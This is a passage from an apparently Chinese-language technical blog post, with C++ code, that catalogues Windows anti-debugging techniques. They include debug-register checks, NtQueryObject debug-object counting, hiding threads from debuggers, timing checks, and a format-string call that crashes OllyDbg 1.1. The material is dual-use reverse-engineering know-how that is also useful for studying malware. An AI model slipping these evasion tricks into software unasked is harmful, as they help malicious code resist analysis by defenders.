&amp;context, <span class=\"built_in\">sizeof</span>(context), <span class=\"literal\">NULL</span>)))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (context.Dr0 || context.Dr1 || context.Dr2 || context.Dr3 || context.Dr6 || context.Dr7)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">DEBUG_LOG</span>(LL_ERR, <span class=\"string\">&quot;Debugger detected via: ThreadWow64Context&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"NtQuerySystemInformation\"><a href=\"#NtQuerySystemInformation\" class=\"headerlink\" title=\"NtQuerySystemInformation\"></a>NtQuerySystemInformation</h2><p>可查询当前系统是否为调试模式。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__kernel_entry NTSTATUS <span class=\"title\">NtQuerySystemInformation</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in, out]       PVOID                    SystemInformation,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            ULONG                    SystemInformationLength,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [out, optional] PULONG                   ReturnLength</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>调试状态下 <code>SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerEnabled</code>值和<code>KernelDebuggerNotPresent</code>值为1。</p>\n<h2 id=\"NtQueryObject\"><a href=\"#NtQueryObject\" class=\"headerlink\" title=\"NtQueryObject\"></a>NtQueryObject</h2><p>可查询内核对象。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__kernel_entry NTSYSCALLAPI NTSTATUS <span class=\"title\">NtQueryObject</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in, optional]  HANDLE                   Handle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            OBJECT_INFORMATION_CLASS ObjectInformationClass,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [out, optional] PVOID                    ObjectInformation,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            ULONG                    ObjectInformationLength,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [out, optional] PULONG                   ReturnLength</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1、ObjectAllTypesInformation\"><a href=\"#1、ObjectAllTypesInformation\" class=\"headerlink\" title=\"1、ObjectAllTypesInformation\"></a>1、ObjectAllTypesInformation</h3><p>通过参数二传入<code>ObjectAllTypesInformation</code>获取所有对象后，判断是否存在调试对象。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 遍历对象信息</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">NtQueryObject</span>(<span class=\"literal\">NULL</span>, ObjectAllInformation, p_Memory, objSize, <span class=\"literal\">NULL</span>) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> main_end;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    p_ObjectAllInfo = (POBJECT_ALL_INFORMATION)p_Memory;</span><br><span class=\"line\">    p_ObjInfoLocation = (PUCHAR)p_ObjectAllInfo-&gt;ObjectTypeInformation;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (UINT i = <span class=\"number\">0</span>; i &lt; p_ObjectAllInfo-&gt;NumberOfObjects; i++) &#123;</span><br><span class=\"line\">        p_ObjectTypeInfo = (POBJECT_TYPE_INFORMATION)p_ObjInfoLocation;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">wcscmp</span>(<span class=\"string\">L&quot;DebugObject&quot;</span>, p_ObjectTypeInfo-&gt;TypeName.Buffer) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p_ObjectTypeInfo-&gt;TotalNumberOfObjects &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                cout &lt;&lt; <span class=\"string\">&quot;发现调试器！&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                cout &lt;&lt; <span class=\"string\">&quot;没有调试器&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p_ObjInfoLocation = (PUCHAR)p_ObjectTypeInfo-&gt;TypeName.Buffer;</span><br><span class=\"line\">        p_ObjInfoLocation += p_ObjectTypeInfo-&gt;TypeName.MaximumLength;</span><br><span class=\"line\">        ULONG_PTR tmp = ((ULONG_PTR)p_ObjInfoLocation) &amp; -(<span class=\"type\">int</span>)<span class=\"built_in\">sizeof</span>(<span class=\"type\">void</span>*);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((ULONG_PTR)tmp != (ULONG_PTR)p_ObjInfoLocation) &#123;</span><br><span class=\"line\">            tmp += <span class=\"built_in\">sizeof</span>(<span class=\"type\">void</span>*);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p_ObjInfoLocation = ((<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)tmp);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、ObjectTypeInformation\"><a href=\"#2、ObjectTypeInformation\" class=\"headerlink\" title=\"2、ObjectTypeInformation\"></a>2、ObjectTypeInformation</h3><p>配合<code>NtCreateDebugObject</code>函数进行检测。首先创建一个调试对象，然后再查询该调试对象类型的对象总数，如果数量为1则表示没有调试，如果数量&gt;1则表示有其他调试器再调试进程。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span> <span class=\"title\">checkDebugObj_4037F0</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-1028h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2[<span class=\"number\">6</span>]; <span class=\"comment\">// [esp+8h] [ebp-1024h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v3; <span class=\"comment\">// [esp+23h] [ebp-1009h]</span></span><br><span class=\"line\">  _DWORD v4[<span class=\"number\">1025</span>]; <span class=\"comment\">// [esp+24h] [ebp-1008h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = <span class=\"number\">1</span>;</span><br><span class=\"line\">  v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v4, <span class=\"number\">0</span>, <span class=\"number\">4096</span>);</span><br><span class=\"line\">  v2[<span class=\"number\">0</span>] = <span class=\"number\">24</span>;</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;v2[<span class=\"number\">1</span>], <span class=\"number\">0</span>, <span class=\"number\">20</span>);</span><br><span class=\"line\">  <span class=\"built_in\">NtCreateDebugObject_404650</span>(&amp;v1, <span class=\"number\">0x1F000F</span>, v2, <span class=\"number\">0</span>);<span class=\"comment\">// 创建一个调试对象</span></span><br><span class=\"line\">  <span class=\"built_in\">NtQueryObject_4045D0</span>(v1, ObjectTypeInformation, v4, <span class=\"number\">0x1000</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v4[<span class=\"number\">3</span>] == <span class=\"number\">1</span> )                             <span class=\"comment\">// 如果只有1个,即自己创建的对象,则没有被调试</span></span><br><span class=\"line\">    v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">NtwClose_404560</span>(v1);                          <span class=\"comment\">// 销毁创建的对象</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"NtSetInformationThread\"><a href=\"#NtSetInformationThread\" class=\"headerlink\" title=\"NtSetInformationThread\"></a>NtSetInformationThread</h2><p>可以通过给线程设置为<code>ThreadHideFromDebugger</code>使调试器无法捕获被隐藏线程的异常信息。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">NTSYSAPI NTSTATUS <span class=\"title\">ZwSetInformationThread</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in] HANDLE          ThreadHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in] THREADINFOCLASS ThreadInformationClass,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in] PVOID           ThreadInformation,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in] ULONG           ThreadInformationLength</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"NtGetContextThread、NtSetContextThread\"><a href=\"#NtGetContextThread、NtSetContextThread\" class=\"headerlink\" title=\"NtGetContextThread、NtSetContextThread\"></a>NtGetContextThread、NtSetContextThread</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">GetThreadContext</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]      HANDLE    hThread,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in, out] LPCONTEXT lpContext</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">SetThreadContext</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in] HANDLE        hThread,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in] <span class=\"type\">const</span> CONTEXT *lpContext</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>基于硬件断点的原理，可以将CR0-CR3寄存器清空，并且检查TF标志位。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">NTSTATUS</span><span class=\"params\">(NTAPI* pfnNtGetContextThread)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    _In_  HANDLE             ThreadHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    _Out_ PCONTEXT           pContext</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    )</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">NTSTATUS</span><span class=\"params\">(NTAPI* pfnNtSetContextThread)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    _In_ HANDLE              ThreadHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    _In_ PCONTEXT            pContext</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    )</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HMODULE hNtDll = <span class=\"built_in\">LoadLibrary</span>(<span class=\"built_in\">TEXT</span>(<span class=\"string\">&quot;ntdll.dll&quot;</span>));</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> fnNtGetContextThread = (pfnNtGetContextThread)<span class=\"built_in\">GetProcAddress</span>(hNtDll, <span class=\"string\">&quot;NtGetContextThread&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> fnNtSetContextThread = (pfnNtSetContextThread)<span class=\"built_in\">GetProcAddress</span>(hNtDll, <span class=\"string\">&quot;NtSetContextThread&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    CONTEXT ctx&#123;&#125;;</span><br><span class=\"line\">    <span class=\"built_in\">fnNtGetContextThread</span>(<span class=\"built_in\">GetCurrentThread</span>(),&amp;ctx);</span><br><span class=\"line\">    ctx.Dr0 = <span class=\"number\">0</span>; <span class=\"comment\">//清空</span></span><br><span class=\"line\">    ctx.Dr1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    ctx.Dr2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    ctx.Dr3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    ctx.EFlags &amp;= <span class=\"number\">0x0FFFFFFF</span>; <span class=\"comment\">//置TF为0</span></span><br><span class=\"line\">    <span class=\"built_in\">fnNtSetContextThread</span>(<span class=\"built_in\">GetCurrentThread</span>(),&amp;ctx);</span><br><span class=\"line\">    <span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"OutputDebugStringA\"><a href=\"#OutputDebugStringA\" class=\"headerlink\" title=\"OutputDebugStringA\"></a>OutputDebugStringA</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">OutputDebugStringA</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in, optional] LPCSTR lpOutputString</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>可以通过构造部分特殊字符串使得调试器崩溃。恶意代码常尝试利用OllyDbg1.1的格式化字符串漏洞，为OutputDebugString函数提供一个%s字符串的参数，让OllyDbg崩溃。因此，需要注意程序中可疑的OutputDebugString调用，例如OutputDebugString(“%s%s%s%s%s%s%s%s%s”)。如果执行了这个调用，OllyDbg将会崩溃。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">CHAR szFakeFormat[] = &#123; <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;%&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"number\">0x0</span> &#125;; </span><br><span class=\"line\"><span class=\"built_in\">OutputDebugStringA</span>(szFakeFormat);</span><br></pre></td></tr></table></figure>\n\n<p>也可以通过设置错误码，检测调试器。在有调试器存在和没有调试器存在时，OutputDebugString函数表现会有所不同。最明显的不同是， 如果有调试器存在，其后的GetLastError()的返回值为零。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">SetLastError</span>(<span class=\"number\">1234</span>); </span><br><span class=\"line\"><span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">tmpD=<span class=\"built_in\">GetLastError</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(tmpD==<span class=\"number\">1234</span>) <span class=\"comment\">//默认为0，但由于设置了自定义的错误码，如果不等于我们设置的，说明被调试器接管。</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"TimeCheck\"><a href=\"#TimeCheck\" class=\"headerlink\" title=\"TimeCheck\"></a>TimeCheck</h2><p>由于断点的存在导致断点前后存在时间差，可以使用GetTickCount或者QueryPerformanceCounter、rdtsc指令，或者等待事件的方法检测。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">CheckSystemTime</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> bRet = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\tBOOLEAN bAdjustPrivRet;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> ntStatus =<span class=\"built_in\">RtlAdjustPrivilege</span>(SE_SYSTEMTIME_PRIVILEGE, TRUE, FALSE, &amp;bAdjustPrivRet);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">NT_SUCCESS</span>(ntStatus))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">auto</span> hEvent = <span class=\"built_in\">CreateEventA</span>(<span class=\"literal\">NULL</span>, FALSE, FALSE, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">IS_VALID_HANDLE</span>(hEvent))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">            <span class=\"comment\">//https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/set.htm</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">NT_SUCCESS</span>(<span class=\"built_in\">NtSetSystemInformation</span>(SystemTimeSlipNotification, &amp;hEvent, <span class=\"built_in\">sizeof</span>(hEvent))))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">WaitForSingleObject</span>(hEvent, <span class=\"number\">1</span>) == WAIT_OBJECT_0) <span class=\"comment\">//如果为有信号,说明进程处于中断状态</span></span><br><span class=\"line\">\t\t\t\t\tbRet = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">CloseHandle</span>(hEvent);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> bRet;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"NtSetDebugFilterState\"><a href=\"#NtSetDebugFilterState\" class=\"headerlink\" title=\"NtSetDebugFilterState\"></a>NtSetDebugFilterState</h2><p>函数ntdll!DbgSetDebugFilterState()和ntdll!NtSetDebugFilterState()只设置一个标志寄存器，如果内核模式的调试器存在，将被检查。<code>因此，如果一个内核调试器被连接到系统上，这些函数将成功。</code>然而，这些函数也可能因为一些用户模式的调试器引起的副作用而成功。这些功能需要管理员的权限。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">CheckDebugFilterState</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> ntStatus = <span class=\"built_in\">NtSetDebugFilterState</span>(<span class=\"number\">0</span>, <span class=\"number\">0</span>, TRUE);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"built_in\">NT_SUCCESS</span>(ntStatus))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HeapSetInformation\"><a href=\"#HeapSetInformation\" class=\"headerlink\" title=\"HeapSetInformation\"></a>HeapSetInformation</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">HeapSetInformation</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in, optional] HANDLE                 HeapHandle,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]           HEAP_INFORMATION_CLASS HeapInformationClass,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]           PVOID                  HeapInformation,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]           SIZE_T                 HeapInformationLength</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>HeapCompatibilityInformation（0）</td>\n<td>启用堆功能。 仅支持<code>低碎片堆 (LFH)</code>。 但是，应用程序不需要启用 LFH，因为系统根据需要使用 LFH 来服务内存分配请求。<br/>Windows XP 和 Windows Server 2003： 默认情况下，LFH 未启用。 若要为指定的堆启用 LFH，请将 HeapInformation 参数指向的变量设置为 2。 为堆启用 LFH 后，无法禁用它。<br/>不能为使用 HEAP_NO_SERIALIZE 创建的堆或固定大小的堆启用 LFH。 如果在 Windows 或 Microsoft 应用程序验证程序调试工具中使用堆调试工具，则无法启用 LFH。<br/><code>在任何调试器下运行进程时，将自动为进程中的所有堆启用某些堆调试选项。 这些堆调试选项阻止使用 LFH。 若要在调试器下运行时启用低碎片堆，请将_NO_DEBUG_HEAP环境变量设置为 1。</code></td>\n</tr>\n</tbody></table>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">CheckHeapSetInformation</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tULONG uHeapInfo = <span class=\"number\">2</span>; <span class=\"comment\">/* HEAP_LFH */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!g_winapiApiTable-&gt;<span class=\"built_in\">HeapSetInformation</span>(g_winapiApiTable-&gt;<span class=\"built_in\">GetProcessHeap</span>(), HeapCompatibilityInformation, &amp;uHeapInfo, <span class=\"built_in\">sizeof</span>(uHeapInfo)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;<span class=\"comment\">//如果能设置则表示有调试</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"NtSystemDebugControl\"><a href=\"#NtSystemDebugControl\" class=\"headerlink\" title=\"NtSystemDebugControl\"></a>NtSystemDebugControl</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">bool</span> <span class=\"title\">CheckSystemDebugControl</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> dwReturnLength\t\t= <span class=\"number\">0UL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">auto</span> ntStatus\t\t\t= g_winapiApiTable-&gt;<span class=\"built_in\">NtSystemDebugControl</span>(SysDbgBreakPoint, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">DEBUG_LOG</span>(LL_SYS, <span class=\"string\">&quot;NtSystemDebugControl completed! Status: %p Return length: %u&quot;</span>, ntStatus, dwReturnLength);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (ntStatus != STATUS_DEBUGGER_INACTIVE);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"RtlCaptureStackBackTrace\"><a href=\"#RtlCaptureStackBackTrace\" class=\"headerlink\" title=\"RtlCaptureStackBackTrace\"></a>RtlCaptureStackBackTrace</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">NTSYSAPI WORD <span class=\"title\">RtlCaptureStackBackTrace</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            DWORD  FramesToSkip,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]            DWORD  FramesToCapture,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [out]           PVOID  *BackTrace,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [out, optional] PDWORD BackTraceHash</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>该函数可以捕获当前调用堆栈的栈回溯。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> once</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;DbgHelp.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(lib,<span class=\"string\">&quot;Dbghelp.lib&quot;</span>)</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">/***********************************</span></span><br><span class=\"line\"><span class=\"comment\">1.PrintfStackInfo(),可打印当前的调用堆栈信息</span></span><br><span class=\"line\"><span class=\"comment\">2.如try catch,无法捕获异常，如除0，访问非法地址等</span></span><br><span class=\"line\"><span class=\"comment\">项目属性中设置 C/C++  -&gt;代码生成  -&gt;启用c++异常选择“是，但有 SEH 异常 (/EHa)”</span></span><br><span class=\"line\"><span class=\"comment\">try</span></span><br><span class=\"line\"><span class=\"comment\">&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t.....</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">catch (...)</span></span><br><span class=\"line\"><span class=\"comment\">&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\tPrintfStackInfo();</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">3.如多个函数嵌套，PrintfStackInfo只会打印当前函数的位置</span></span><br><span class=\"line\"><span class=\"comment\">/***********************************/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">wchar2strstring</span><span class=\"params\">(std::string &amp; szDst, WCHAR * wchart)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">wchar_t</span> * wtext = wchart;</span><br><span class=\"line\">\tDWORD dwNmu = <span class=\"built_in\">WideCharToMultiByte</span>(CP_OEMCP, <span class=\"literal\">NULL</span>, wtext, <span class=\"number\">-1</span>, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\">\t<span class=\"type\">char</span> * psTest;</span><br><span class=\"line\">\tpsTest = <span class=\"keyword\">new</span> <span class=\"type\">char</span>[dwNmu];</span><br><span class=\"line\">\t<span class=\"built_in\">WideCharToMultiByte</span>(CP_OEMCP, <span class=\"literal\">NULL</span>, wtext, <span class=\"number\">-1</span>, psTest, dwNmu, <span class=\"literal\">NULL</span>, FALSE);</span><br><span class=\"line\">\tszDst = psTest;</span><br><span class=\"line\">\t<span class=\"keyword\">delete</span>[]psTest;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ShowTraceStack</span><span class=\"params\">(std::vector&lt;std::string&gt;&amp; vInfo)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tvInfo.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">enum</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tMAX_STACK_FRAMES = <span class=\"number\">16</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">\t<span class=\"type\">void</span>* arrBackTrace[MAX_STACK_FRAMES] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">\tHANDLE 